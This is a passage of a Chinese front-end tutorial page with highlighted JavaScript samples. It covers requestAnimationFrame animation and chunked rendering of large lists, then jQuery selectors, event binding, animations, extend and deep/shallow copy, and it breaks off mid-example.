    <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        self<span class="token punctuation">.</span>style<span class="token punctuation">.</span>transform <span class="token operator">=</span> <span class="token string">'rotate('</span> <span class="token operator">+</span> <span class="token punctuation">(</span>deg<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'deg)'</span><span class="token punctuation">;</span>
        id <span class="token operator">=</span> <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>change<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'stop'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">cancelAnimationFrame</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h5 id="大数据渲染"><a href="#大数据渲染" class="header-anchor">#</a> 大数据渲染</h5> <p>在大数据渲染过程中，比如表格的渲染，<strong>如果不进行一些性能策略处理，就会出现 UI 冻结现象，用户体验极差</strong>。有个场景，将后台返回的十万条记录插入到表格中，如果一次性在循环中生成 DOM 元素，会导致页面卡顿5s左右。<strong>这时候我们就可以用 <code>requestAnimationFrame</code> 进行分步渲染，确定最好的时间间隔，使得页面加载过程中很流畅。</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> total <span class="token operator">=</span> <span class="token number">100000</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> size <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> count <span class="token operator">=</span> total <span class="token operator">/</span> size<span class="token punctuation">;</span>
<span class="token keyword">var</span> done <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> ul <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'list'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">addItems</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> li <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> fg <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createDocumentFragment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        li <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        li<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'item '</span> <span class="token operator">+</span> <span class="token punctuation">(</span>done <span class="token operator">*</span> size <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        fg<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    ul<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>fg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    done<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>done <span class="token operator">&lt;</span> count<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>addItems<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>addItems<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="_9-jquery-zepto"><a href="#_9-jquery-zepto" class="header-anchor">#</a> 9:jQuery/zepto</h3> <p>jQuery是一个基于DOM操作的类库;</p> <h4 id="初始化-使用"><a href="#初始化-使用" class="header-anchor">#</a> 初始化/使用</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>检测是否正确引入Jquery<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">&quot;text/javascript&quot;</span> src<span class="token operator">=</span><span class="token string">&quot;public/js/jquery-2.2.3.min.js&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
  <span class="token comment">// $(document).ready(function () {</span>
  <span class="token comment">//   alert(&quot;jquery it work&quot;);</span>
  <span class="token comment">// });</span>
  <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;jquery it work&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><strong>选择器的使用方式</strong></p> <ul><li>并列：$(&quot;div,span, p.myClass&quot;)</li> <li>家族：$(&quot;form input&quot;)</li> <li>父子：$(&quot;form &gt; input&quot;)</li> <li>紧邻：$(&quot;label + input&quot;)</li> <li>同辈[后辈]：$(&quot;form ~ input&quot;)</li></ul> <p><strong>jQuery/css选择器的区别</strong></p> <ol><li>两者的作用不同，CSS选择器找到元素后为<strong>设置该元素的样式</strong>，<strong>jQuery选择器找到元素后添加行为</strong>;</li> <li>jQuery选择器拥有更好的跨浏览器的兼容性;</li></ol> <h4 id="jquery对象与dom对象"><a href="#jquery对象与dom对象" class="header-anchor">#</a> jQuery对象与Dom对象</h4> <h5 id="dom对象转换为jquery对象"><a href="#dom对象转换为jquery对象" class="header-anchor">#</a> <strong>dom对象转换为jquery对象</strong></h5> <p>一般情况下，dom对象直接<strong>用$()就可以转换成jquery对象</strong>，如：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;samy&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h5 id="jquery对象转换成dom对象"><a href="#jquery对象转换成dom对象" class="header-anchor">#</a> <strong>jquery对象转换成dom对象</strong></h5> <p>一种是<strong>用jquery的内置函数get</strong>，来获取dom对象，如：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;#samy&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>还有一种方法更简单，因为jquery对象的属性是一个集合，所以我们<strong>可以像数组那样，取出其中一项就行</strong>：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;#samy&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;div&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//上面这两种返回的都是dom对象,可以直接使用js里的方法</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><blockquote><h5 id="document-getelementbyid-myid-还是-myid-更高效率"><a href="#document-getelementbyid-myid-还是-myid-更高效率" class="header-anchor">#</a> document.getElementbyId(&quot;myId&quot;) 还是 $(&quot;#myId&quot;)更高效率?</h5></blockquote> <p>第一种，因为它<strong>直接调用了 JavaScript 引擎</strong>。</p> <p>document.getElementById(&quot;samy&quot;)😕/这种方法获<strong>取到的就是dom对</strong>象</p> <p>$(&quot;#samy&quot;): //这种方式获取得到的<strong>就是jquery对象</strong></p> <h4 id="事件相关"><a href="#事件相关" class="header-anchor">#</a> 事件相关</h4> <h5 id="浏览器事件"><a href="#浏览器事件" class="header-anchor">#</a> 浏览器事件</h5> <ul><li><strong>ready</strong> 文档就绪事件（当 HTML 文档就绪可用时）
加载/退出 ready() : document.onload
提示：ready() 函数不应与 <code>&lt;body onload=&quot;&quot;&gt;</code> 一起使用。
<ul><li>ready() 函数用于在<strong>文档进入ready状态时执行代码</strong>。</li> <li>当DOM 完全加载（例如HTML被完全解析DOM树构建完成时），jQuery允许你执行代码。使用**$(document).ready()<strong>的最大好处在于</strong>它适用于所有浏览器，jQuery帮你解决了跨浏览器的难题**。</li></ul></li> <li><strong>resize</strong> 触发、或将函数绑定到指定元素的 resize 事件  尺寸缩放</li> <li><strong>scroll</strong> 触发、或将函数绑定到指定元素的 scroll 事件</li></ul> <p><strong>window.onload 事件和 jQuery ready 函数区别</strong></p> <ul><li><p>1.<strong>执行时间</strong>
window.onload<strong>必须等到页面内包括图片的所有元素</strong>加载完毕后才能执行。
$(document).ready()是<strong>DOM结构绘制完毕后就执行</strong>，不必等到加载完毕。</p></li> <li><p>2.<strong>编写个数不同</strong>
window.onload不能同时编写多个，如果有多个window.onload方法，只会执行一个
$(document).ready()可<strong>以同时编写多个，并且都可以得到执行</strong></p></li> <li><p>3.<strong>简化写法</strong>
window.onload没有简化写法
<strong>$(document).ready(function(){})可以简写成$(function(){});</strong></p></li></ul> <h5 id="事件处理方式"><a href="#事件处理方式" class="header-anchor">#</a> 事件处理方式</h5> <ul><li><strong>on</strong></li> <li><strong>bind</strong> 向匹配元素附加一个或更多事件处理器</li> <li><strong>unbind</strong> 从匹配元素移除一个被添加的事件处理器</li> <li><strong>trigger</strong> 所有匹配元素的指定事件</li></ul> <h5 id="bind-live-delegate-on-的区别"><a href="#bind-live-delegate-on-的区别" class="header-anchor">#</a> bind(),live(),delegate(),on()的区别</h5> <blockquote><p>jquery中bind(),live(),delegate()都是基于on实现的，<strong>on是封装了一个兼容的事件绑定方法</strong>，在选择元素上绑定一个或多个事件的事件处理函数;</p></blockquote> <ul><li><strong>bind</strong>(type,[data],fn) 为每个匹配元素的特定事件绑定事件处理函数</li> <li><strong>live</strong>(type,[data],fn) 给所有匹配的元素附加一个事件处理函数，即使这个元素是以后再添加进来的</li> <li><strong>delegate</strong>(selector,[type],[data],fn) 指定的元素（属于被选元素的子元素）添加一个或多个事件处理程序，并规定当这些事件发生时运行的函数</li></ul> <p><strong>差别</strong>：</p> <ul><li>.bind()是<strong>直接绑定在元素上</strong></li> <li>.live()则是<strong>通过冒泡的方式来绑定到元素</strong>上的。更适合列表类型的，绑定到document DOM节点上。和.bind()的优势是<strong>支持动态数据</strong>。</li> <li>.delegate()则是更精确的小范围使用事件代理，<strong>性能优于.live()</strong></li> <li>.on()则是最新的1.9版本<strong>整合了之前的三种方式的新事件绑定机制</strong>；【推荐】</li></ul> <h4 id="动画"><a href="#动画" class="header-anchor">#</a> 动画</h4> <h5 id="基本动画方法"><a href="#基本动画方法" class="header-anchor">#</a> 基本动画<strong>方法</strong></h5> <ul><li>show( speed, [callback])</li> <li>hide( speed, [callback])</li> <li>toggle( speed, [callback])</li></ul> <p><strong>toggle默认切换hide()和show()</strong>
　　如果你在toggle()方法自定义多个方法，则toggle()是切换你的方法，toggle语法实际如下:
　　$(selector).toggle(function1(),function2(),functionN(),...)</p> <h5 id="动画优化"><a href="#动画优化" class="header-anchor">#</a> 动画优化</h5> <blockquote><h4 id="jquery-的-slideup动画-如果目标元素是被外部事件驱动-当鼠标快速地连续触发外部元素事件-动画会滞后的反复执行-该如何处理呢"><a href="#jquery-的-slideup动画-如果目标元素是被外部事件驱动-当鼠标快速地连续触发外部元素事件-动画会滞后的反复执行-该如何处理呢" class="header-anchor">#</a> jQuery 的 slideUp动画 ，如果目标元素是被外部事件驱动, 当鼠标快速地连续触发外部元素事件, 动画会滞后的反复执行，该如何处理呢?</h4></blockquote> <ul><li>在触发元素上的事件<strong>设置为延迟处理</strong>：使用 JS 原生 setTimeout 方法</li> <li>在触发元素的事件时<strong>预先停止所有的动画，再执行相应的动画事件</strong>：$('.tab').stop().slideUp();</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 上下滑动【卷帘门效果】</span>
<span class="token comment">// 显示</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;#t_slideDown&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.img_container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 隐藏</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;#t_slideUp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.img_container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// toggle</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;#t_slideToggle&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.img_container'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideToggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h4 id="实现原理借鉴"><a href="#实现原理借鉴" class="header-anchor">#</a> 实现原理借鉴</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">window<span class="token punctuation">,</span> <span class="token keyword">undefined</span></span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//A</span>
  <span class="token comment">//用一个函数域包起来，就是所谓的沙箱</span>
  <span class="token comment">//在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局</span>
  <span class="token comment">//把当前沙箱需要的外部变量通过函数参数引入进来</span>
  <span class="token comment">//只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数</span>
  window<span class="token punctuation">.</span>jQuery <span class="token operator">=</span> window<span class="token punctuation">.</span>$ <span class="token operator">=</span> jQuery<span class="token punctuation">;</span><span class="token comment">//B</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span> window <span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><ul><li><p><code>(function(window, undefined) {})(window);</code>:jQuery 利用 JS 函数作用域的特性，采用立即调用表达式包裹了自身，解决命名空间和变量污染问题</p></li> <li><p><code>window.jQuery = window.$ = jQuery;</code>在闭包当中将 jQuery 和 $ 绑定到 window 上，从而将 jQuery 和 $ 暴露为全局变量</p></li></ul> <p><strong>jQuery或zepto源码写的好的地方</strong></p> <ul><li>jquery源码封装在一个匿名函数的自执行环境中，<strong>有助于防止变量的全局污染</strong>;
<ul><li>通过传入window对象参数，可以使window对象作为局部变量使用，好处是当jquery中访问window对象的时候，就不用将作用域链退回到顶层作用域了**，从而可以更快的访问window对象**。</li> <li>同样，传入undefined参数，<strong>可以缩短查找undefined时的作用域链</strong></li></ul></li> <li>jquery将一些原型属性和方法封装在了jquery.prototype中，为了缩短名称，又赋值给了&gt;jquery.fn，这是很形象的写法;</li> <li>jquery实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率。 <strong>jquery的优势就是链式操作，隐式迭代</strong>;</li></ul> <blockquote><h4 id="this-和-this-关键字在-jquery-中有何不同"><a href="#this-和-this-关键字在-jquery-中有何不同" class="header-anchor">#</a> $(this) 和 this 关键字在 jQuery 中有何不同</h4></blockquote> <ul><li>this表示的是javascript提供的当前对象</li> <li><strong>$(this)<strong>表示的是</strong>用jquery封装候的当前对象</strong></li></ul> <blockquote><h4 id="jquery-中的方法链是什么-使用方法链有什么好处"><a href="#jquery-中的方法链是什么-使用方法链有什么好处" class="header-anchor">#</a> jQuery 中的方法链是什么？使用方法链有什么好处？</h4></blockquote> <p>方法链是对一个方法返回的结果调用另一个方法，<strong>这使得代码简洁明了</strong>，同时<strong>由于只对 DOM 进行了一轮查找，性能方面更加出色。</strong></p> <h4 id="extend-fn-extend"><a href="#extend-fn-extend" class="header-anchor">#</a> extend/fn.extend</h4> <ul><li>$.extend(object); // <strong>为jQuery添加“静态方法”</strong>（工具方法）</li> <li>$.extend([true,] targetObject, object1[, object2]); // 对targt对象进行扩展</li> <li>$.fn.extend(json); // <strong>为jQuery添加“成员函数”</strong>（实例方法）;<strong>源码中jquery.fn = jquery.prototype</strong>，所以对jquery.fn的扩展，就是为jquery<strong>类添加成员函数</strong></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>jQuery<span class="token punctuation">.</span>fn <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token function-variable function">init</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> context</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//....</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="拷贝-extend-的实现原理"><a href="#拷贝-extend-的实现原理" class="header-anchor">#</a> 拷贝(extend)的实现原理</h4> <p><strong>浅拷贝</strong>（只复制一份原始对象的引用）
<code>var newObject = $.extend({}, oldObject);</code></p> <p><strong>深拷贝</strong>（对原始对象属性所引用的对象进行进行递归拷贝）; 这种方式会完全拷贝所有数据，优点是与不会相互依赖（完全脱离关联），缺点是拷贝的速度更慢，代价更大。
<code>var newObject = $.extend(true, {}, oldObject);</code></p> <h5 id="扩展序列化及反序列化功能"><a href="#扩展序列化及反序列化功能" class="header-anchor">#</a> 扩展序列化及反序列化功能</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//jQuery 中没有提供这个功能，所以需要先编写两个jQuery的扩展： 简单扩展；内部实现，详见下面；</span>
$<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function-variable function">stringifyArray</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
$<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function-variable function">parseArray</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token comment">//然后调用:</span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">&quot;#xxx&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stringifyArray</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token comment">//$(&quot;#xxx&quot;)为一个jQuery实例</span>

<span class="token comment">// 通过原生 JSON.stringify/JSON.parse 扩展 jQuery 实现</span>
$<span class="token punctuation">.</span><span class="token function-variable function">array2json</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
$<span class="token punctuation">.</span><span class="token function-variable function">json2array</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// $.parseJSON(array); // 3.0 开始，已过时</span>
  <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 调用</span>
<span class="token keyword">var</span> json <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">array2json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> array <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">json2array</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p><code>新版本</code>已经实现： <strong>$.parseJSON()</strong> 函数用于将符合标准格式的的JSON字符串转为与之<strong>对应的JavaScript对象</strong>。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">var</span> obj <span class="token operator">=</span> jQuery<span class="token punctuation">.</span><span class="token function">parseJSON</span><span class="token punctuation">(</span><span class="token string">'{&quot;name&quot;:&quot;samy&quot;}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">alert</span><span class="token punctuation">(</span> obj<span class="token punctuation">.</span>name <span class="token operator">===</span> <span class="token string">&quot;samy&quot;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">'[{&quot;href&quot;:&quot;baidu.com&quot;,&quot;text&quot;:&quot;test&quot;,&quot;orgId&quot;:123,&quot;dataType&quot;:&quot;curry&quot;}]'</span><span class="token punctuation">;</span>
jQuery<span class="token punctuation">.</span><span class="token function">parseJSON</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h5 id="深浅拷贝的实现"><a href="#深浅拷贝的实现" class="header-anchor">#</a> 深浅拷贝的实现</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code>$ <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">//浅复制的模拟实现</span>
  <span class="token function-variable function">extend</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//浅拷贝</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>name <span class="token keyword">in</span> options<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
      target<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> options<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
    <span class="token keyword">return</span> target<span class="token punctuation">;</span> 
  <span class="token punctuation">}</span><span class="token punctuation">,</span> 
  <span class="token function-variable function">extend</span> <span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">deep<span class="token punctuation">,</span> target<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//深拷贝</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>name <span class="token keyword">in</span> options<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
      copy <span class="token operator">=</span> options<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span> 
      <span class="token keyword">if</span> <span class="token punctuation">(</span>deep <span class="token operator">&amp;&amp;</span> copy <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        target<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span>deep<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> copy<span class="token punctuation">)</span><span class="token punctuation">;</span> 
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>deep <span class="token operator">&amp;&amp;</span> copy <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        target<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span>deep<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> copy<span class="token punctuation">)</span><span class="token punctuation">;</span> 
